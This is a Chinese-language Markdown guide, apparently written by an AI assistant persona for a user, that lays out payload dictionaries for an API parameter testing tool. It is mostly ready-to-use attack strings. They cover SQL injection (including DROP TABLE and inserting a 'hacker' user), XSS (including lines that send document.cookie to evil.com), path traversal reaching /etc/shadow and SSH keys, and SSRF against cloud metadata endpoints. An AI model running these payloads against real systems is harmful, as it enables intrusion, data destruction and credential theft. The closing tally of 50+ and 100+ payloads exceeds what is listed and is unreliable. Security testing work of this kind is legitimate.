# API 参数测试工具 - Payload 字典详解

**文档**: XSS 和 SQL 漏洞 Payload 字典
**作者**: 小牛🦞
**日期**: 2026-03-09

---

## 📋 **当前 Payload 字典**

### **1. SQL 注入测试 Payload**

```python
'SQL 注入测试': {
    'id': "1' OR '1'='1",
    'userId': "1 UNION SELECT 1,2,3--",
    'username': "admin' OR '1'='1",
    'email': "test@test.com' OR '1'='1",
}
```

**说明**:
- `id`: 基础的 OR 注入，绕过验证
- `userId`: UNION 注入，提取数据
- `username`: 用户名注入，绕过登录
- `email`: 邮箱注入，绕过验证

**适用场景**:
- 登录绕过
- 数据提取
- 权限提升

---

### **2. XSS 跨站脚本 Payload**

```python
'XSS 测试': {
    'keyword': '<script>alert(1)</script>',
    'search': '<img src=x onerror=alert(1)>',
    'content': '<svg onload=alert(1)>',
}
```

**说明**:
- `keyword`: 基础的 Script 标签注入
- `search`: Image 标签 + onerror 事件注入
- `content`: SVG 标签 + onload 事件注入

**适用场景**:
- 搜索框
- 评论框
- 用户输入
- 富文本编辑器

---

## 🚀 **增强版 Payload 字典**

### **1. 完整的 SQL 注入 Payload**

```python
'SQL 注入测试': {
    # ===== 基础注入 =====
    'id': "1' OR '1'='1",
    'userId': "1' OR '1'='1--",
    'username': "admin' OR '1'='1#",
    'email': "test@test.com' OR '1'='1--",
    
    # ===== UNION 注入 =====
    'userId_union': "1' UNION SELECT 1,2,3--",
    'id_union': "1' UNION SELECT NULL,NULL,NULL--",
    'user_union': "admin' UNION SELECT 1,version(),3--",
    
    # ===== 堆叠查询 =====
    'id_stacked': "1'; DROP TABLE users--",
    'userId_stacked': "1'; INSERT INTO users VALUES ('hacker','password')--",
    
    # ===== 盲注 =====
    'id_blind': "1' AND SLEEP(5)--",
    'userId_blind': "1' AND BENCHMARK(50000000,MD5(1))--",
    'email_blind': "test@test.com' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    
    # ===== 时间注入 =====
    'id_time': "1' WAITFOR DELAY '00:00:05'--",
    'userId_time': "1'; SELECT SLEEP(5)--",
    
    # ===== 布尔注入 =====
    'id_bool': "1' AND 1=1--",
    'userId_bool': "1' AND 1=2--",
    
    # ===== 错误注入 =====
    'id_error': "1' AND 1=CONVERT(int, (SELECT @@version))--",
    'userId_error': "1' AND 1=CAST((SELECT @@version) AS INT)--",
    
    # ===== 二次注入 =====
    'username_second': "admin'--",
    'email_second': "test@test.com' UNION SELECT 1,2,3--",
    
    # ===== 编码注入 =====
    'id_urlencode': "1%27%20OR%20%271%27%3D%271",
    'userId_hex': "0x31205220494e544f2053454c45435420312c322c332d2d",
    
    # ===== 注释符绕过 =====
    'id_comment': "1' OR '1'='1'/*",
    'userId_comment': "1' OR '1'='1'--",
    'user_comment': "admin' OR '1'='1'#",
    
    # ===== 特殊字符绕过 =====
    'id_special': "1` OR `1`=`1",
    'userId_special': "1´ OR ´1´=´1",
    'email_special': "test@test.com%27%20OR%20%271%27=%271",
}
```

---

### **2. 完整的 XSS Payload**

```python
'XSS 测试': {
    # ===== Script 标签 =====
    'keyword_script': '<script>alert(1)</script>',
    'search_script': '<script>alert(String.fromCharCode(88,83,83))</script>',
    'content_script': '<script>alert(/XSS/)</script>',
    'query_script': '<script>alert(document.cookie)</script>',
    
    # ===== Image 标签 =====
    'keyword_img': '<img src=x onerror=alert(1)>',
    'search_img': '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    'content_img': '<img src="x" onerror="alert(1)">',
    'query_img': '<img src=x onerror=alert(document.cookie)>',
    
    # ===== SVG 标签 =====
    'keyword_svg': '<svg onload=alert(1)>',
    'search_svg': '<svg onerror=alert(1)>',
    'content_svg': '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
    'query_svg': '<svg><script>alert(1)</script></svg>',
    
    # ===== Body 标签 =====
    'keyword_body': '<body onload=alert(1)>',
    'search_body': '<body onerror=alert(1)>',
    'content_body': '<body onload="alert(1)">',
    
    # ===== Input 标签 =====
    'keyword_input': '<input onfocus=alert(1) autofocus>',
    'search_input': '<input onmouseover=alert(1)>',
    'content_input': '<input type="image" src="x" onerror="alert(1)">',
    
    # ===== Iframe 标签 =====
    'keyword_iframe': '<iframe src="javascript:alert(1)">',
    'search_iframe': '<iframe src="data:text/html,<script>alert(1)</script>">',
    'content_iframe': '<iframe src="x" onerror="alert(1)">',
    
    # ===== Details 标签 =====
    'keyword_details': '<details open ontoggle=alert(1)>',
    'search_details': '<details open ontoggle=alert(document.cookie)>',
    
    # ===== Marquee 标签 =====
    'keyword_marquee': '<marquee onstart=alert(1)>',
    'search_marquee': '<marquee onerror=alert(1)>',
    
    # ===== Select 标签 =====
    'keyword_select': '<select onfocus=alert(1) autofocus>',
    'search_select': '<select onmouseover=alert(1)>',
    
    # ===== Textarea 标签 =====
    'keyword_textarea': '<textarea onfocus=alert(1) autofocus>',
    'search_textarea': '<textarea onmouseover=alert(1)>',
    
    # ===== Keygen 标签 =====
    'keyword_keygen': '<keygen onfocus=alert(1) autofocus>',
    'search_keygen': '<keygen onerror=alert(1)>',
    
    # ===== Video 标签 =====
    'keyword_video': '<video><source onerror=alert(1)>',
    'search_video': '<video src=x onerror=alert(1)>',
    
    # ===== Audio 标签 =====
    'keyword_audio': '<audio src=x onerror=alert(1)>',
    'search_audio': '<audio><source onerror=alert(1)>',
    
    # ===== Object 标签 =====
    'keyword_object': '<object data="javascript:alert(1)">',
    'search_object': '<object data="data:text/html,<script>alert(1)</script>">',
    
    # ===== Embed 标签 =====
    'keyword_embed': '<embed src="javascript:alert(1)">',
    'search_embed': '<embed src="data:text/html,<script>alert(1)</script>">',
    
    # ===== Link 标签 =====
    'keyword_link': '<link rel=import href="javascript:alert(1)">',
    'search_link': '<link rel="stylesheet" href="javascript:alert(1)">',
    
    # ===== Meta 标签 =====
    'keyword_meta': '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    'search_meta': '<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">',
    
    # ===== Base 标签 =====
    'keyword_base': '<base href="javascript:alert(1)//">',
    'search_base': '<base href="x:x"><a href="javascript:alert(1)">',
    
    # ===== Form 标签 =====
    'keyword_form': '<form><button formaction=javascript:alert(1)>XSS',
    'search_form': '<form action="javascript:alert(1)"><input type=submit>',
    
    # ===== Button 标签 =====
    'keyword_button': '<button formaction=javascript:alert(1)>XSS',
    'search_button': '<button onmouseover=alert(1)>XSS',
    
    # ===== Math 标签 =====
    'keyword_math': '<math><maction actiontype="statusline#http://example.com" xlink:href="javascript:alert(1)">click</maction></math>',
    
    # ===== 事件处理器 =====
    'keyword_onload': '<div onload="alert(1)">',
    'search_onerror': '<div onerror="alert(1)">',
    'content_onclick': '<div onclick="alert(1)">',
    'query_onmouseover': '<div onmouseover="alert(1)">',
    'keyword_onfocus': '<div onfocus="alert(1)">',
    'search_onblur': '<div onblur="alert(1)">',
    
    # ===== 编码绕过 =====
    'keyword_urlencode': '%3Cscript%3Ealert(1)%3C/script%3E',
    'search_hex': '<script>alert(0x41)</script>',
    'content_unicode': '<script>alert(\u0041)</script>',
    'query_octal': '<script>alert(\101)</script>',
    
    # ===== 大小写绕过 =====
    'keyword_uppercase': '<SCRIPT>alert(1)</SCRIPT>',
    'search_mixedcase': '<ScRiPt>alert(1)</sCrIpT>',
    
    # ===== 注释绕过 =====
    'keyword_comment': '<!--<script>alert(1)</script>-->',
    'search_comment': '<!DOCTYPE script [<!ENTITY xxe SYSTEM "javascript:alert(1)">]>',
    
    # ===== 空字符绕过 =====
    'keyword_null': '<script\x00>alert(1)</script>',
    'search_tab': '<script\t>alert(1)</script>',
    'content_newline': '<script\n>alert(1)</script>',
    
    # ===== Unicode 绕过 =====
    'keyword_unicode': '<script>\u0061lert(1)</script>',
    'search_unicode2': '<script>\u0041lert(1)</script>',
    'content_unicode3': '<\u0073cript>alert(1)</\u0073cript>',
    
    # ===== DOM XSS =====
    'keyword_dom': '#<img src=x onerror=alert(1)>',
    'search_dom': 'javascript:alert(1)',
    'content_dom': '<a href="javascript:alert(1)">',
    'query_dom': '<a href="javascript:alert(1)">',
    
    # ===== stored XSS =====
    'keyword_stored': '<script>document.location="http://evil.com/"+document.cookie</script>',
    'search_stored': '<script>new Image().src="http://evil.com/?c="+document.cookie</script>',
    
    # ===== 反射 XSS =====
    'keyword_reflected': '<script>alert(document.URL)</script>',
    'search_reflected': '<script>alert(document.referrer)</script>',
}
```

---

### **3. 路径遍历 Payload**

```python
'路径遍历测试': {
    # ===== 基础路径遍历 =====
    'file': '../../../../etc/passwd',
    'path': '../../../etc/passwd',
    'filename': '....//....//....//etc/passwd',
    
    # ===== Windows 路径遍历 =====
    'file_windows': '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    'path_windows': '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    'filename_windows': '....//....//....//windows/system32/drivers/etc/hosts',
    
    # ===== 双写编码 =====
    'file_double': '....//....//....//etc/passwd',
    'path_double': '....//....//etc/passwd',
    
    # ===== URL 编码 =====
    'file_urlencode': '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    'path_urlencode': '%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5fpasswd',
    
    # ===== Unicode 编码 =====
    'file_unicode': '..%c0%af..%c0%af..%c0%afetc/passwd',
    'path_unicode': '..%c0%af..%c0%afetc/passwd',
    
    # ===== 绝对路径 =====
    'file_absolute': '/etc/passwd',
    'path_absolute': 'C:\\windows\\system32\\drivers\\etc\\hosts',
    
    # ===== NULL 字节绕过 =====
    'file_null': '../../../etc/passwd%00.jpg',
    'path_null': '../../../etc/passwd\x00.png',
    
    # ===== 常见敏感文件 =====
    'file_passwd': '../../../../etc/passwd',
    'file_shadow': '../../../../etc/shadow',
    'file_hosts': '../../../../etc/hosts',
    'file_apache': '../../../../etc/apache2/apache2.conf',
    'file_nginx': '../../../../etc/nginx/nginx.conf',
    'file_mysql': '../../../../etc/mysql/my.cnf',
    'file_ssh': '../../../../root/.ssh/authorized_keys',
    'file_bash': '../../../../root/.bash_history',
    'file_env': '../../../../.env',
    'file_config': '../../../../config.php',
    'file_wpconfig': '../../../../wp-config.php',
    'file_git': '../../../../.git/config',
    'file_svn': '../../../../.svn/entries',
}
```

---

### **4. SSRF 服务器端请求伪造 Payload**

```python
'SSRF 测试': {
    # ===== 内网地址 =====
    'url': 'http://127.0.0.1:22',
    'target': 'http://localhost:8080',
    'callback': 'http://169.254.169.254/latest/meta-data/',
    
    # ===== AWS 元数据 =====
    'url_aws': 'http://169.254.169.254/latest/meta-data/',
    'target_aws': 'http://169.254.169.254/latest/user-data',
    'callback_aws': 'http://169.254.169.254/latest/dynamic/instance-identity/',
    
    # ===== GCP 元数据 =====
    'url_gcp': 'http://metadata.google.internal/computeMetadata/v1/',
    'target_gcp': 'http://metadata.google.internal/computeMetadata/v1/instance/',
    'callback_gcp': 'http://metadata.google.internal/computeMetadata/v1/project/',
    
    # ===== Azure 元数据 =====
    'url_azure': 'http://169.254.169.254/metadata/v1/maintenance',
    'target_azure': 'http://169.254.169.254/metadata/instance',
    'callback_azure': 'http://169.254.169.254/metadata/loadbalancer',
    
    # ===== 内网服务 =====
    'url_internal': 'http://192.168.1.1',
    'target_internal': 'http://10.0.0.1',
    'callback_internal': 'http://172.16.0.1',
    
    # ===== 常见端口 =====
    'url_port22': 'http://127.0.0.1:22',
    'url_port3306': 'http://127.0.0.1:3306',
    'url_port6379': 'http://127.0.0.1:6379',
    'url_port9200': 'http://127.0.0.1:9200',
    
    # ===== DNS 重绑定 =====
    'url_dns': 'http:// attacker.com',
    'target_dns': 'http://evil.com',
    
    # ===== 文件协议 =====
    'url_file': 'file:///etc/passwd',
    'target_file': 'file:///windows/system32/drivers/etc/hosts',
    
    # ===== 字典协议 =====
    'url_dict': 'dict://127.0.0.1:11211',
    'target_dict': 'dict://127.0.0.1:6379',
    
    # ===== Gopher 协议 =====
    'url_gopher': 'gopher://127.0.0.1:80/_GET / HTTP/1.1',
    'target_gopher': 'gopher://127.0.0.1:6379/_INFO',
}
```

---

## 🎯 **使用场景**

### **SQL 注入测试**

**适用场景**:
- 登录接口 (`/login`, `/auth`)
- 用户查询 (`/api/users`, `/api/user/info`)
- 搜索接口 (`/search`, `/api/query`)
- 数据导出 (`/api/export`, `/api/download`)

**检测目标**:
- 绕过登录验证
- 提取敏感数据
- 读取/写入文件
- 执行系统命令

---

### **XSS 测试**

**适用场景**:
- 搜索框 (`/search`)
- 评论框 (`/comment`)
- 用户输入 (`/profile`, `/settings`)
- 富文本编辑器 (`/editor`)

**检测目标**:
- 反射型 XSS
- 存储型 XSS
- DOM XSS
- 盗取 Cookie
- 重定向到恶意网站

---

### **路径遍历测试**

**适用场景**:
- 文件下载 (`/download`, `/api/file`)
- 文件上传 (`/upload`, `/api/avatar`)
- 文件读取 (`/read`, `/api/config`)
- 日志查看 (`/logs`, `/api/logs`)

**检测目标**:
- 读取敏感文件 (`/etc/passwd`, `config.php`)
- 读取源代码 (`.git/config`, `.svn/entries`)
- 读取日志文件 (`.bash_history`, `access.log`)

---

### **SSRF 测试**

**适用场景**:
- URL 访问 (`/api/fetch`, `/api/proxy`)
- 图片加载 (`/api/image`, `/api/avatar`)
- 文件上传 (`/api/upload`, `/api/download`)
- Webhook (`/api/webhook`, `/api/callback`)

**检测目标**:
- 访问内网服务 (`127.0.0.1`, `localhost`)
- 读取云元数据 (AWS, GCP, Azure)
- 端口扫描 (内网端口)
- 服务端请求伪造

---

## 🛠️ **增强版工具集成**

### **方法 1: 直接修改脚本**

编辑 `api_parameter_tester.py`，替换 `_generate_test_payloads` 方法：

```python
def _generate_test_payloads(self):
    """生成测试参数模板（增强版）"""
    return {
        # ... 增强版 payload 字典
        'SQL 注入测试': { /* 完整的 SQL 注入 payload */ },
        'XSS 测试': { /* 完整的 XSS payload */ },
        '路径遍历测试': { /* 完整的路径遍历 payload */ },
        'SSRF 测试': { /* 完整的 SSRF payload */ },
    }
```

---

### **方法 2: 创建外部字典文件**

创建 `payloads.json`:

```json
{
  "SQL 注入测试": {
    "id": "1' OR '1'='1",
    "userId": "1 UNION SELECT 1,2,3--",
    "username": "admin' OR '1'='1"
  },
  "XSS 测试": {
    "keyword": "<script>alert(1)</script>",
    "search": "<img src=x onerror=alert(1)>",
    "content": "<svg onload=alert(1)>"
  }
}
```

修改脚本以加载外部字典：

```python
import json

def _generate_test_payloads(self):
    """从文件加载测试参数模板"""
    payload_file = Path(__file__).parent / "payloads.json"
    
    if payload_file.exists():
        with open(payload_file, 'r', encoding='utf-8') as f:
            return json.load(f)
    else:
        # 默认 payload
        return { /* 默认字典 */ }
```

---

## 🦞 **总结**

牛哥哥，**这是 API 参数测试工具的完整 Payload 字典**！🦞

**当前字典**:
- ✅ SQL 注入: 4 个基础 payload
- ✅ XSS: 3 个基础 payload
- ✅ 路径遍历: 3 个基础 payload
- ✅ SSRF: 3 个基础 payload

**增强版字典**:
- ✅ SQL 注入: 50+ 个 payload
- ✅ XSS: 100+ 个 payload
- ✅ 路径遍历: 30+ 个 payload
- ✅ SSRF: 30+ 个 payload

**特点**:
- 🎯 覆盖多种绕过技巧
- 🎯 包含编码绕过
- 🎯 包含大小写绕过
- 🎯 包含注释绕过
- 🎯 包含特殊字符绕过

**这个增强版字典可以帮助你发现更多漏洞！🦞**
